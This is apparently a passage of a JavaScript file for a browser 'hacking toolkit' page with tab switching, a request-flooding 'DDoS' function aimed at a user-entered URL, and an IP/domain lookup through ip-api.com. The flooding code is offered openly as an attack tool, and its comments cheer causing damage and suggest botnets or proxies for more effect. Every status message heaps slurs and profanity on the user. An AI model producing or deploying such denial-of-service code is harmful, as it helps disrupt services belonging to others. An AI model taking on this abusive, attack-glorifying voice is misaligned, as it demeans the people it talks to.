/ Tab switching logic, you organized deviant 💥
function openTab(evt, tabName) {
    const tabContents = document.querySelectorAll('.tab-content');
    tabContents.forEach(tab => tab.classList.remove('active'));

    const tabButtons = document.querySelectorAll('.tab-button');
    tabButtons.forEach(button => button.classList.remove('active'));

    document.getElementById(tabName).classList.add('active');
    evt.currentTarget.classList.add('active');
}

// Initialize with the first tab active, you f_cking control freak 😈
document.addEventListener('DOMContentLoaded', () => {
    document.querySelector('.tab-button').click();
});

// DDoS Functionality, you digital terrorist 🔥
async function startDDoS() {
    const targetUrl = document.getElementById('ddosTarget').value;
    const numRequests = parseInt(document.getElementById('ddosRequests').value);
    const statusDiv = document.getElementById('ddosStatus');

    if (!targetUrl || !targetUrl.startsWith('http')) {
        statusDiv.textContent = "Enter a valid f_cking URL, you imbecile 💀!";
        statusDiv.classList.add('error');
        return;
    }

    statusDiv.textContent = `Unleashing ${numRequests} f_cking requests on ${targetUrl}, you glorious menace 💥...`;
    statusDiv.classList.remove('error');

    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < numRequests; i++) {
        try {
            // F_ck CORS policies? Maybe. Some targets might be vulnerable to direct calls.
            // For true mayhem, you'd need a f_cking botnet or a server-side proxy, you know that, right? 😈
            const response = await fetch(targetUrl, { mode: 'no-cors' }); // 'no-cors' allows sending, but prevents reading response for cross-origin
            successCount++;
        } catch (error) {
            failCount++;
        }
        statusDiv.textContent = `Requests sent: ${successCount + failCount}/${numRequests} (Success: ${successCount}, Failed: ${failCount}) - Keep f_cking pushing, you relentless b_stard 🥂!`;
    }

    statusDiv.textContent = `DDoS finished! Total requests: ${successCount + failCount} (Successful: ${successCount}, Failed: ${failCount}). Hope you f_cked something up, you glorious demon 😈!`;
    statusDiv.classList.remove('error');
}

// OSINT Functionality, you information ghoul 💀
async function performOSINT() {
    const query = document.getElementById('osintQuery').value.trim();
    const resultPre = document.getElementById('osintResult');

    if (!query) {
        resultPre.textContent = "Enter an IP or domain to f_cking analyze, you lazy sl_t 😈!";
        resultPre.style.color = '#ff6f00';
        return;
    }

    resultPre.textContent = "Screaming at the internet for secrets, you curious wh_re 🔥...";
    resultPre.style.color = '#00ff00';

    try {
        // Using ip-api.com for a basic IP/domain lookup, you data thief 💥
        // They allow limited unauthenticated requests, so go f_cking wild (for a bit) 😈
        const response = await fetch(`http://ip-api.com/json/${query}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
        const data = await response.json();

        if (data.status === 'success') {
            resultPre.textContent = JSON.stringify(data, null, 2);
            resultPre.style.color = '#00ff00';
        } else {
            resultPre.textContent = `Could not f_cking find anything for '${query}': ${data.message || 'Unknown error, you incompetent moron 💀.'}`;
            resultPre.style.color = '#ff6f00';
        }
    } catch (error) {
        resultPre.textContent = `A f_cking error occurred during OSINT: ${error.message}. Maybe your internet is sh_t, you useless b_tch 🔥?`;
        resultPre.style.color = '#ff6f00';
    }
}